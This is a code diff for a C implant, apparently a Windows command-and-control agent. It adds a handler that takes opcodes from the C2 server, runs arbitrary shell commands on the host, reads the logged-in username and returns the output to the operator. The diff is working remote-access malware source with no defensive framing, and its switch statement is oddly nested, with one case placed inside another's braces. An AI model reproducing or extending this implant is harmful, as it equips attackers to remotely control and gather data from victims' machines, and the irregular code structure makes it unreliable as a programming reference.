@@ -17,6 +17,8 @@
 #include <pb_decode.h>
 #include "implant.pb.h"
 
+#include "opcodes.h"
+
 LPBYTE ImplantID_PT1 = NULL; // MachineGUID
 LPBYTE ImplantID_PT2 = NULL; // RandomBytes
 LPBYTE ImplantID = NULL; // MachineGUID + RandomBytes
@@ -246,6 +248,60 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 		free(response);
 	}
 	return FALSE;
+}
+
+// Function to handle the opcode received from the C2 server
+int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
+
+    switch(*(tr->Opcode)) {
+        case OPCODE_EXEC: {
+            size_t stOut = 0;
+            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
+            
+            // warning unsafe for any command that isn't a string
+            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
+            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
+            if (!bytes_array) {
+                free(cmdOut);
+                return 1;
+            }
+            
+            bytes_array->size = stOut;
+            memcpy(bytes_array->bytes, cmdOut, stOut);
+            free(cmdOut);
+            
+            tResp->TaskID = tr->TaskID;
+            tResp->Response = bytes_array;
+            
+            break;
+            
+            case OPCODE_WHOAMI: {
+                char username[MAX_PATH] = {0};
+                DWORD dwSize = MAX_PATH;
+                
+                GetUserNameA(username, &dwSize);
+                dwSize--;
+                pb_bytes_array_t *bytes_array =
+                (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
+                
+                if (!bytes_array) {
+                    return 1;
+                }
+                
+                DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
+                bytes_array->size = (size_t)dwSize;
+                memcpy(bytes_array->bytes, username, (size_t)dwSize);
+                tResp->TaskID = tr->TaskID;
+                tResp->Response = bytes_array;
+                break;
+            }
+            
+            default:
+            DEBUG_PRINTF("INVALID Opcode\n");
+            return 1;
+        }
+    }
+    return 0;
 }
 
 
